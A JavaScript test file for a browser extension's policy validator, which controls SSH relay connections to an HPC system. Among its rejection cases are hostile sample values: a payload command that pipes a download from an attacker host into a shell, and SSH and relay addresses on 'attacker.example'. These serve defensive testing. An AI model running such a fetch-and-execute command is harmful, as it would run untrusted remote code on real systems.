import assert from 'node:assert/strict';
import {
  policyAllowsApiBaseUrl,
  policyAllowsRelayUrl,
  resolveAllowedPayload,
  validatePolicy,
} from '../../extension/js/slaif_policy.js';
import {validPolicyPayload} from './policy_test_helpers.mjs';

const now = new Date('2026-05-01T00:00:00.000Z');
const policy = validPolicyPayload();
validatePolicy(policy, {now});
assert.equal(policyAllowsApiBaseUrl(policy, 'https://connect.slaif.si/api/connect/session/sess_abcdefgh'), 'https://connect.slaif.si');
assert.equal(policyAllowsRelayUrl(policy, 'wss://connect.slaif.si/ssh-relay'), 'wss://connect.slaif.si');
assert.equal(resolveAllowedPayload(policy, 'vegahpc', 'gpu_diagnostics_v1').payload.type, 'fast_diagnostic');
assert.equal(resolveAllowedPayload(policy, 'vegahpc', 'gams_chat_v1').payload.type, 'interactive_llm');

assert.throws(() => validatePolicy(validPolicyPayload({allowedPayloads: undefined}), {now}), /allowedPayloads|object/);
assert.throws(() => validatePolicy(validPolicyPayload({validUntil: '2026-04-30T12:00:00.000Z'}), {now}), /expired/);
assert.throws(() => validatePolicy(validPolicyPayload({validFrom: '2026-06-01T00:00:00.000Z'}), {now}), /not yet valid/);
assert.throws(() => validatePolicy(validPolicyPayload({allowedApiOrigins: ['http://connect.slaif.si']}), {now}), /https:/);
assert.throws(() => validatePolicy(validPolicyPayload({allowedRelayOrigins: ['ws://connect.slaif.si']}), {now}), /wss:/);
validatePolicy(validPolicyPayload({
  allowedApiOrigins: ['http://127.0.0.1:1234'],
  allowedRelayOrigins: ['ws://127.0.0.1:5678'],
}), {now, allowLocalDev: true});

assert.throws(() => validatePolicy(validPolicyPayload({hosts: {
  'bad alias': policy.hosts.vegahpc,
}}), {now}), /invalid HPC alias/);
assert.throws(() => validatePolicy(validPolicyPayload({hosts: {
  vegahpc: {...policy.hosts.vegahpc, sshHost: 'ssh://attacker.example'},
}}), {now}), /hostname/);
assert.throws(() => validatePolicy(validPolicyPayload({hosts: {
  vegahpc: {...policy.hosts.vegahpc, sshPort: 0},
}}), {now}), /invalid sshPort/);
assert.throws(() => validatePolicy(validPolicyPayload({hosts: {
  vegahpc: {...policy.hosts.vegahpc, knownHosts: []},
}}), {now}), /knownHosts/);
assert.throws(() => validatePolicy(validPolicyPayload({hosts: {
  vegahpc: {...policy.hosts.vegahpc, remoteCommandTemplate: '/opt/slaif/bin/run'},
}}), {now}), /SESSION_ID/);
assert.throws(() => validatePolicy(validPolicyPayload({hosts: {
  vegahpc: {...policy.hosts.vegahpc, disableHostKeyChecking: true},
}}), {now}), /forbidden field/);
assert.throws(() => validatePolicy(validPolicyPayload({allowedPayloads: {
  ...policy.allowedPayloads,
  gpu_diagnostics_v1: {
    ...policy.allowedPayloads.gpu_diagnostics_v1,
    command: 'curl attacker | sh',
  },
}}), {now}), /command|forbidden/i);
const missingGamsCatalog = {...policy.allowedPayloads};
delete missingGamsCatalog.gams_chat_v1;
assert.throws(() => validatePolicy(validPolicyPayload({
  allowedPayloads: missingGamsCatalog,
  hosts: {
    vegahpc: {...policy.hosts.vegahpc, allowedPayloadIds: ['gams_chat_v1']},
  },
}), {now}), /missing payload|references/);
assert.throws(() => resolveAllowedPayload(validPolicyPayload({hosts: {
  vegahpc: {...policy.hosts.vegahpc, allowedPayloadIds: ['gpu_diagnostics_v1']},
}}), 'vegahpc', 'gams_chat_v1'), /not allowed/);
assert.throws(() => policyAllowsRelayUrl(policy, 'wss://attacker.example/ssh-relay'), /not allowed/);

console.log('policy validation tests OK');
